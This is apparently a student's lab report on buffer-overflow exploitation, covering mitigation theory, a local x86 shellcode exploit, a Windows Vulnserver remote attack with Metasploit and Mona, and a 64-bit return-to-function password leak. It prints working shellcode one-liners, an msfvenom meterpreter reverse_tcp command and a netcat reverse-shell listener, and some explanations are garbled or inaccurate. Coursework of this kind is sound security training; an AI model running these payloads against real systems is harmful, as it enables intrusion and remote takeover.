###### tags: `OT`
:::success
# OT Lab 2 Assignment: Software Testing
**Name: Radomskiy Ilia**
st10 even = Choice 1
:::

---
# Buffer Overflow (low-level exploitations)

## Task 1: Theory

:::info
1. What binary exploitation mitigation techniques do you know?
:::

**Data Execution Prevention (DEP)** - memory defense mechanism, is embedded in the OS. This technique allows to mark part of the memory as Non-executable, and it is not possible to execute something from the stack, heap, etc. `VirtualAlloc` can be used in order to execute something. But offcourse it is protected, and additionally, the application can specify the `VirtualProtect` function

**Address Space Layout Randomization (ASLR)** - it is when the location of application data is random, so the attacker doesn't know where he should go, make an offset in order to access it. Unfortunately, not all data can be fully randomized, system libraries for example

**Stack Canaries** - is part of the code. In this part, offset is taken into consideration, and if, there is no match at the end of the program, that means someone tries to change offset. That triggers exit from the execution of the program.


:::info
2. Did `NX` solve all binary attacks? Why?
:::

Non-executable very useful protection technique, but not completely protected. The most common technique used by attackers is `ROP` - Return-oriented programming, execution code without executing.

It is possible to use `ROP` because attacker is not writing any code into memory, code is reused by the attacker. Is reused in form of `gadgets`. The gadget is a small part of code consisting of registering reservations and returning to the new gadget. At the end of this chain, there may be the ability to access the shell command line, for example

`ROP` attack with the chain of `gadgets` (red rectangular) and communication with the memory (stack) is shown in the picture below.

<center>

![](https://i.imgur.com/gcryyOJ.png)

</center>

If `ROP` with the chain of gadgets is not enough then the second exploit **` Stack pivoting`** enters the game.
In this case, a gadget is used in order to redirect the stack pointer to a different location.

Another way to bypass `NX` is **`Ret2libc attack`**. Redirection to standard `C` library full name of this exploit. Such functions as `system()`, `open()`, `read()`, `write()` can be called by the attacker in order to continue exploration. 
For example `system(“/bin/sh”)` spawns an interactive shell. [1]

But all above can be migrated with the ASLR, it is still possible to perform attacks above, but it makes it harder.

For example `Procedural Linkage Table` (PLT) or the `Global Offset Table` (GOT) can be used in order to redirect program flow to another function.

Or memory leak edge can lead to some understanding of the included libraries.

:::info
3. Why do stack canaris end with 00?
:::

It is a terminator. The Canary consists of the terminator, random data, and random `hor`. 

Terminator: consisting of string terminating character (new line, null, 00 e.t.c.). Idea is simple. This terminator is an analogy to the end of the program, after that nothing can be done. the attacker won’t be able to include code in the payload. [2]

:::info
4. What is NOP sled?
:::

`NOP` - Sequence of the non-operation instructions. If we speak about exploits attackers often use this technique in order to bypass ASLR. `HOPE` is some kind of huge trap, laying down in the memory, and, when the program jumps to this NOP, boom, eventually that may lead to the shell code execution

---

## Task 2: Binary attack - Warming up

:::info
We are going to work buffer overlow attack as one of the main, most popular and widely-spread binary attack. You are given a binary `warm_up`.
Answer for the question and provide explanation details with PoC: "Why in the `warm_up` binary, opposite to the binary64 from Lab1, the value of `i` doesn't change even if our input was very long?"
:::

As we can see from the picture below, the only difference is the amount of bytes. So let's continue the investigation

<center>

![](https://i.imgur.com/1CV0gjg.png)

</center>

But, when we run binaries, we can see the difference between them. It is a stack `canary`. And in the `warm_up` there is one, but in the `sample_64`, there is not
By further `ghidra` analysis, we can see more differences in them.
In the picture below we can see the difference between them, the output of the program is the same, until we enter value of more than 10 as input. Warm_up binary gives us a `stack smashing` error, and `sample 64` gives different memory values for the `i` parameter after stack smashing.

<center>

![](https://i.imgur.com/YrOXegl.png)

</center>

Graphically, binary from the first lab is smaller, because there is no preparation for the final comparison of the `canary`. Final if statement is a `canary`, and we deciding, is the `canary` buffer have changed or not

<center>

![](https://i.imgur.com/W3bqIRT.png)

</center>

As you can see from the picture below in the `warm_up` binary(left part of the picture) there is 1 variable specified for the cannary. Is is `local_10`, and if it is changed, than, the program interrupts. And it will be interrupted if the value of the input/buffer will be more than 10

<center>

![](https://i.imgur.com/x34bNms.png)

</center>

If that situation happens then is buffer overflow, and in the case of `warm_up` binary, we can see the error message.
But, in the case of `sample 64`, there is no such message, and the value of the `i` is overwritten

Strange thing, that in `warm_up` binary, in the stack, value is also have changed. But because of the canary, it was detected and returned with an error. The original value in the stack is not corrupted

<center>

![](https://i.imgur.com/NNfAREK.png)
    
</center>

Opposite to the `sample_64` binary, when the value of `i` is changed to a new one

<center>

![](https://i.imgur.com/TLyDuyH.png)

</center>



---

## Task 3 - Linux local buffer overflow attack x86

:::info
1. Create a new file and put the code above into it:
:::

From this code will be created binary file 

<center>

![](https://i.imgur.com/WcBf32n.png)
    
</center>


:::info
2. Compile the file with C code in the binary with following parameters in the case if you use x64 system:
:::

To compile code use the following script

```bash=
gcc -o binary -fno-stack-protector -m32 -z execstack source.c
compiler -o output -architecture -z disable dep of stack (execute code in compiler) from file  
```

:::info
3. Disable ASLR before to start the buffer overflow attack:
:::

set 0 in the file in order to turn of randomization

```
/proc/sys/kernel/randomize_va_space
```

:::info
4. Anyway, you can just download the pre-compiled binary `task3` .
:::

Output the same, but the `ghidra` and `gdb` disassembly is a little bit different

<center>

![](https://i.imgur.com/OffKdzO.png)
    
</center>


:::info
5. Choose any debugger to disassembly the binary. GNU debugger (gdb) is the default choice.
:::

`gdb-pwndbg` is my choice of debugger 

:::info
6. Perform the disassembly of the required function of the program.
:::

With `disas main` we can see disassembled `main` function of the `task 3` 

the `task 3` binary

<center>

![](https://i.imgur.com/8U5ZRAq.png)

</center>

:::info
7. Find the name and address of the target function. Copy the address of the function that follows (is located below) this function to jump across EIP.
:::

The name of the target function is `strcpy` and its memory location is `0x0804846c`

<center>
    
![](https://i.imgur.com/gWwkoti.png)
    
</center>

:::info
8. Set the breakpoint with the assigned address.
:::

with `b *(adress/function)` we can set up breakpoint.

<center>

![](https://i.imgur.com/ydU8YEV.png)

</center>


:::info
9. Run the program with output which corresponds to the size of the buffer.
:::

Running with custom input can be achieved with `r (input)`.
Or with `./task $(python -c "print 'A'*128")`

<center>

![](https://i.imgur.com/9OdOI4B.png)

</center>

:::info
10. Examine the stack location and detect the start memory address of the buffer. In other words, this is the point where we break the program and rewrite the EIP.
:::

Stack is located in `0xffffcfe0`, and it is visible in the picture below.

<center>

![](https://i.imgur.com/jvQSIEO.png)

</center>

`EIP` value is `0xf7dd8ee5` and it is located in the `0xffffcfdc` address


:::info
11. Find the size of the writable memory on the stack. Re-run the same command as in the step #9 but without breakpoints now. Increase the size of output symbols with several bytes that we want to print until we get the overflow. In this way, we will iterate through different addresses in memory, determine the location of the stack and find out where we can "jump" to execute the shell code. Make sure that you get the segmentation fault instead the normal program completion. In simple words, we perform a kinda of fuzzing.
:::

After running programs with the different amounts of input, we can notice two outputs of the programs: normal and `bufferoverflow`
From the test, it is clear that input longer than 128 symbols causes `buffer overflow`

<center>

![](https://i.imgur.com/OBOf2QA.png)
normal output
    
![](https://i.imgur.com/eFGn3Y1.png)
bufferoverflow
</center>

:::info
12. After detecting the size of the writable memory on the previous step, we should figure out the NOP sleds and inject out shell code to fill this memory space. You can find the shell codes examples on the external resources, generate it by yourself (e.g., msfvenom). The shell code address should lie down after the address of the return function. You are also given the pre-prepared 46 bytes long shell code:
```
"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
```
:::

We can see our instruction pointer. EIP value is `0xf7dd8ee5` and it is located in the `0xffffcfdc` address. With this in mind, we can find information required for constructing a script

<center>

![](https://i.imgur.com/K6zxQHz.png)
    
</center>


:::info
13. Basically, we don't know the address of shell code. We can avoid this issue using NOP processor instruction: 0x90 . If the processor encounters a NOP command, it simply proceeds to the next command (on next byte). We can add many NOP sleds and it helps us to execute the shell code regardless of overwriting the return address. Define how many NOP sleds you can write: Value of the writable memory - Size of the shell code.
:::

In the picture below we can see the `stack`. `0x41414141` is `A` in hex. And it is inside the buffer. `0xf7dd8ee5` address of the EIP we will use in order to jump to the exploit shellcode. Because `buffer` is `128` `offset` between `buffer` and `eip` is `12`, it gives `140` bytes in total for the possible amount of bytes in the script. Part of this amount is shellcode, so `46` bytes. that is why we will put `\x90 *94` + `shell script` and `return address`.

<center>

![](https://i.imgur.com/IfU5sBW.png)
    
</center>



:::info
14. Run the program with our exploit composition: \x90 * the number of NOP sleds + shell code + the memory location that we want to "jump" to execute our code. To do it, we have to overwrite the IP which prescribe which piece of code will be run next.
:::

According to the information gathered above we can construct exploit code.

```bash=
./task3 $(python -c "print('\x90'*(the number of NOP sleds = ((buf + offset to eip and eip) - size of shell code - eip)) + 'shell code' + 'jump to')")
./task3 $(python -c "print('\x90'*(144-46-4)+'\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + '\xc8\xcf\xff\xff')")
```


:::info
15. Make sure that you get the root shell on your virtual machine.
:::

On the picture below you can see that this exploit is working fine

<center>

![](https://i.imgur.com/sxHCPE8.png)
    
</center>

---

## Task 4 - Windows remote buffer overflow attack x86

:::spoiler
You can use a Linux virtual machine or your Linux host system (to save compute resources) as the attacker machine. And you might use Windows 10 virtual machine as victim.
:::

:::info
1. Download Windows 10 VM. You can use this link to download Win10 VM for **Oracle VirtualBox**.
:::

I will use `virtual box` and `win 10` machine

:::info
2. Connect your victim VM and attacker host to one network using, for example, bridge adapter in **VirtualBox**.
:::

Mine machines are conected to `br0`
Host 10.1.1.67
Vulnserver 10.1.1.27

<center>

![](https://i.imgur.com/dYhJQKZ.png)
    
![](https://i.imgur.com/RUzUTGe.png)

</center>


:::info
3. Download the software to your Windows 10 VM:
:::

Installed
Victum
* Vulnerable Server - just run as admin

![](https://i.imgur.com/FSKcaMf.png)

* Immunity Debugger - just run as admin
`C:\Program Files
(x86)\ImmunityInc\Immunity Debugger` with Mona Modules in it

* Mona Modules - drop in PyCommands

Win defender turned off

Attacker
* Metasploit Framework

![](https://i.imgur.com/V8Z90uq.png)

:::spoiler
sudo apt-get install -y ruby libopenssl-ruby libyaml-ruby libdl-ruby libiconv-ruby libreadline-ruby irb ri rubygems subversion
sudo apt-get build-dep ruby
sudo apt-get install -y ruby-dev libpcap-dev rubygems libsqlite3-dev
sudo gem install -y sqlite3-ruby
sudo apt-get install -y rubygems libmysqlclient-dev
sudo gem install0 -y mysql
sudo apt install -y bundler

sudo bundle install

service script /etc/init.d/metasploit
folder /opt/metasploit

Disable Anti-Virus!
disable firewall
./msfconsole

:::

:::info
4. Test your connection between attacker and victim PC. For example, you can use **nc -nv** command.
:::
We can test connection with the 
```
nc -nv 10.1.1.27 9999
```

And you can see results of such connetion on the picture below
<center>

![](https://i.imgur.com/20YyuBF.png)
    
</center>


:::info
5. In **Immunity Debugger** run the `Vulnerable server` process.
:::

I am running `Vulnerable server` inside the Immunity Debugger. It is visible on the picture

<center>

![](https://i.imgur.com/6voxMP9.png)
    
</center>


:::info
6. Using any programming language (Python or C are preferred), write the script to implement the **fuzzing**: using **TRUN** command of vulnerable server, you should crash the victim VMsending a data array via vulnerable channel. Your script should also tell you how many bytes were committed at the time of the crash. Make your script executable and run it. After this make sure that victim VM was crashed (**Immunity Debugger** is set to pause mode).
:::

Server was broken after recieving 2002 symbols

<center>
    
![](https://i.imgur.com/fYvr5OT.png)

</center>

:::info
7. Immediately after victim crashing stop your fuzzing script (CTRL + C) and note the crashing moment: remember at which bytes EIP starts.
:::

With the buffer overflow we can get a violation writing something in `00F000000`

<center>

![](https://i.imgur.com/dNWUf1x.png)
    
</center>

After proceeding with `shift+f9` we can find that we accessing `B7B6B5B4` or `EIP` register

<center>

![](https://i.imgur.com/V5OzcbK.png)
    
</center>

:::info
8. Using **pattern_create.rb** from **Metasploit Framework**, generate the pattern of bytes a little bit more than you received on the previous step. Or you can use the following link.
:::

From the link we can get pattern in order to overflow buffer of the server. And this cause a crush

<center>

![](https://i.imgur.com/dNWUf1x.png)
    
</center>

:::info
9. Create/modify the script to overwrote the **EIP** value. Copy in this script the pattern that you got on the previous step. Also, you no longer need to get information on which bytes the fuzzing has crashed. Re-run **Immunity Debugger**. Make your script executable and run it.
:::

New crush happens, during EIP examination. Now we want to overwrite EIP with `AAAA`.
In the picture below you can see that this register was overwriten with `41414141` or `AAAA` in `ASCII`

<center>

![](https://i.imgur.com/bPkTt9H.png)
    
</center>

:::info
10. Make sure that that **Immunity Debugger** again crashed and **EIP** value was overwrote.
:::

As we seen from the pictures above crash has accured, and we can find littel bit more information about `EIP` in the picture below.

<center>

![](https://i.imgur.com/00KvYlM.png)
    
</center>

:::info
11. Using **pattern_offset.rb** from **Metasploit Framework**, put your overwrote **EIP** value from **Immunity Debugger** and figure out the exact location (offset) of **EIP** that you can write.
:::

Calculated offset helps us to find out amount of characters requared in order to overwrite EIP

<center>

![](https://i.imgur.com/h3gioJW.png)
    
</center>


:::info
12. Knowing the value of the **EIP** offset, create a script to overwrite the **EIP** value. Most likely, **4 bytes** should be added to your script in addition to the offset value to overwrite the **EIP** value. Make your script executable and run it.
:::

New script, with the offset in it is shown in the picture below

<center>

![](https://i.imgur.com/GORghEi.png)
    
</center>

:::info
13. Make sure that you overwrite the **EIP** value with some specific characters.
:::

With the information about  offset we can place exact data in `EIP`. It will be string `BCDE`

<center>

![](https://i.imgur.com/T5CBSOz.png)
    
</center>

That is also cause an error

<center>

![](https://i.imgur.com/bc272VY.png)
    
</center>

:::info
14. To use **Mona** module, type **!mona modules** in the command line at the bottom of **Immunity Debugger**. This will let you know what programs there are without memory protection. Look at the resources without memory protections, find the vulnerable server process (most likely, **essfunc.dll**), make sure that it has "false" statements.
:::

Running `!mona modules` gives us an output, and it is visible on the picture below

<center>

![](https://i.imgur.com/aY5MjFT.png)
    
</center>

Now we can set parameters for the execution and run `!mona rop -m essfunc.dll` in order to find vulnerable server process, library `essfunc.dll`

```
!mona config -set workingfolder C:\Users\Administrator\Documents
```
<center>

![](https://i.imgur.com/SbluC8g.png)

</center>

:::info
15. Using **nasm_shell.rb** from **Metasploit Framework**, type **JMP ESP** into the nasm console. This will let you know code for **JMP ESP** in hex. Using **nasm_shell.rb** may require installing additional libraries.
:::

We can run module of extended assembly in order to retrieve code for `JMP ESP`. It is

```
00000000 FFE4
```

<center>

![](https://i.imgur.com/13rrjQe.png)
    
</center>

:::info
16. Type **!mona find -s 'FFE4' -m essfunc.dll** . Copy the hex address of **essfunc.dll**.
:::

With !mona find -s 'FFE4' -m essfunc.dll we can find information about the address of the library. It is `0x625011af`

<center>

![](https://i.imgur.com/DBiT34o.png)

</center>

:::info
17. Knowing the hex address of **essfunc.dll**, in **Immunity Debugger** search and find the address of **essfunc.dll**. Press **F2** button on this address to create the breakpoint. Then run thevulnerable server process in **Immunity Debugger**.
:::



:::info
18. Modify the script adding the address of **essfunc.dll** in little-endian format. Make your script executable and run it.
:::


:::info
19. Make sure that **EIP** register overwritten in **Immunity Debugger**.
:::



:::info
20. Using **msfvenom** from **Metasploit Framework**, generate a shellcode. Mark **LHOST** as your attacker machine **IP** address and **LPORT** to **4444**, use **-a x86** parameter to set the architecture to **x86**.
:::

This command will be used in order to create shellcode

<center>

![](https://i.imgur.com/hVqReKu.png)

</center>



```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.1.67 LPORT=4444 -a x86 -b '\x00\x0A\x0D'
```

:::info
21. In another terminal window, run the back connect (reverse shell): **nc -nvlp 4444** .
:::

We can start `reverse shell` with `nc -nvlp 4444`

<center>

![](https://i.imgur.com/fqLj31i.png)
listening with nc
    
</center>


:::info
22. Create the final script to exploit the buffer overflow vulnerability. The exploit variable have to consist: **\x90 * pad size + shell code + the memory location + "some fuzzing input" * "EIP offset value"** . Make your script executable and run it.
:::

Final script is looking like that



:::info
23. Make sure that you get the shell root on the terminal for backdoor connection.
:::

I was able to get message of connection recieved but, get root access to the shell not.

<center>
    
![](https://i.imgur.com/l7rtBmo.png)
listening with metasploit
    
![](https://i.imgur.com/xY4lGyf.png)

</center>

If you not turn off windows defender then you will get this message
![](https://i.imgur.com/SSuUR8y.png)


:::info
**Bonus: implement another way to do buffer overflow attack on Win32 App & PE binary.**
:::

---

## Task 5 - Catch the password x64

:::info
1. You are given a binary compiled for 64-bit architecture. Try to exploit buffer overflow vulnerability and find out the right password.
:::

First of all lets test binary with the different input.
Luckily binary is simple, so with the big input we get `Segmentation fault` or `bufferoverflow`. Limit of the buffer is 136

<center>

![](https://i.imgur.com/3WXcXFg.png)
    
</center>

Below we can see, how, by analyzing this binary we can retrive password from it, but lets try to get it with `bufferoverflow` exploit

<center>

![](https://i.imgur.com/z8hMu8L.png)
Setting breakpoint
![](https://i.imgur.com/1rYEF5x.png)
Found password, during comparisson
</center>

But, insid ethe programm there function pring password, and we can return into it with our exploit

<center>

![](https://i.imgur.com/180DkYu.png)
    
</center>

Inside this function we can recieve memory address of the function and construnc script

<center>
    
![](https://i.imgur.com/HdxTxch.png)
    
</center>

```bash=
sudo python -c "print '\x90' * 136" + '\xdd\x05\x40\x00' | ./task5
```

AFter retriving the password we can check if it is fine one or not

<center>

![](https://i.imgur.com/CH3N3ht.png)
    
![](https://i.imgur.com/LNavX0s.png)
    
</center>



:::info
2. Questions:
:::

* What differences do you find between debugging 32-bit and 64-bit applications?

Anout of register increased, also there are different prefixes in 64-bit aplications `R()` and in 32-bit aplications `E()`

* Do we need to use shell code to do this task? Justify your answer.

No, we just need to leak password

---

## **Bonus - Buffer overflow attack with memory protection enabled**

A challenge for those who want to defeat memory protection via stack canaries leaking and ROP. You need to deploy the docker container on your machine.

:::info
An acquaintance of mine, a first-year student, began writing a program to exchange secrets
between friends. Since he loves to show off, he opened access to his program on a public port, on
his Arch Linux.
Help me teach him a lesson.
:::

---

## References
1. [Protecting binaryes](https://vickieli.dev/binary%20exploitation/protecting-binaries/)
2. [Stack canaries](https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-4-stack-canaries-e9b6dd2c3127)



:::spoiler
https://github.com/eteran/edb-debugger
sudo apt install -y qt5-default qtcreator libboost-all-dev libcapstone2 libcapstone-dev graphviz
sudo apt install -y qt5-default qtcreator libboost-all-dev  libcapstone-dev graphviz cmake libqt5xmlpatterns5-dev qttools5-dev-tools qttools5-dev libqt5svg5-dev libqt5x11extras5-dev

https://russianblogs.com/article/2137438551/
pida
sudo apt install python3-pip
pip install peda

al
```
./task3 $(python -c "print('\x90'*(140-46)+'\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' + '\x4c\xcf\xff\xff')")
```
task3

disassemble main
```
   0x08048453 <+6>:	sub    esp,0x90
```

esp 0xffffcf00 —▸ 0xffffcf10 ◂— 0x61616161 ('aaaa')

x $esp
0xffffcf00:	0xffffcf10



![](https://i.imgur.com/0iwKQ7V.png)

76296819 8917 mov dword ptr ds:[edi], edx

![](https://i.imgur.com/C5bI3L9.png)

B7B6B5B4

:::